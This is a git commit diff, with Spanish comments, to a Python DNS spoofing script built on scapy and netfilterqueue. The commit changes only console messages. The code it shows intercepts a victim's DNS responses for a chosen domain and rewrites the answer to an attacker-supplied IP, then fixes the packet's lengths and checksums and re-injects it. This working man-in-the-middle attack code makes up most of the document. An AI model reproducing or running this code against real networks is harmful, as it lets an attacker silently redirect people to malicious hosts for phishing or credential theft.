e31f7314878146389240da9e519e6c158959caf1
Fegamon <fegamon1999@gmail.com>
2022-02-02 13:45:57 -0500

    Se agregaron mensajes impresos por consola para que el usuario sepa lo que està ocurriendo

--- dnsSpoof.py
+++ dnsSpoof.py
@@ -15,17 +15,14 @@ def processPacket(packet):
     
     #Filtra los paquetes DNS Response Record
     if scapyPacket.haslayer(scapy.DNSRR):
-        print('Antes:')
-        print(scapyPacket.show())
-
         qname = scapyPacket[scapy.DNSQR].qname #Obtenemos el nombre del sitio web al que ha accedido la víctima 
         
         #Realiza el DNS Spoof si la víctima ha accedido a la página deseada
         if options.domain in str(qname):
-            print('[+] Spoofing target')
+            print(f'\r[+] El objetivo ha ingresado a {options.domain}\n[+] Comenzando spoofing...\n\n', end= '')
             #Para spoofear a la víctima debemos modificar el "rrname" y el "rdata" ubicado en "DNS Resource Record"
             answer = scapy.DNSRR(rrname= qname, rdata= options.redirectIp)
-            scapyPacket[scapy.DNS].an = answer
+            scapyPacket[scapy.DNS].an = answer 
             scapyPacket[scapy.DNS].ancount = 1 #Es necesario que los contadores de respuesta(ancount) sean igual a "1"
             
             #Ahora se debe eliminar los parámetros "len" y "chksum" de las capas "UPD" y "IP"
@@ -35,11 +32,8 @@ def processPacket(packet):
             del scapyPacket[scapy.UDP].chksum
 
             #Todas las modificaciones que hemos realizado, las pasamos al paquete original para que el Spoof se realice
-            print('Seteando el paquete')
             packet.set_payload(bytes(scapyPacket))
-            print('\n\n\n\n\n\n---------------------------------------\nDespues:')
-            newPacket = scapy.IP(packet.get_payload())
-            print(newPacket.show())
+            print('\r[+] Redirección exitosa\n\n', end= '')
 
     packet.accept()
 
@@ -48,6 +42,7 @@ queue = netfilterqueue.NetfilterQueue()
 queue.bind(int(options.queueNum), processPacket)
 
 try:    
+    print(f'Iniciando programa\nEsperando que el objetivo acceda {options.domain}...')
     queue.run()
 
 except KeyboardInterrupt:
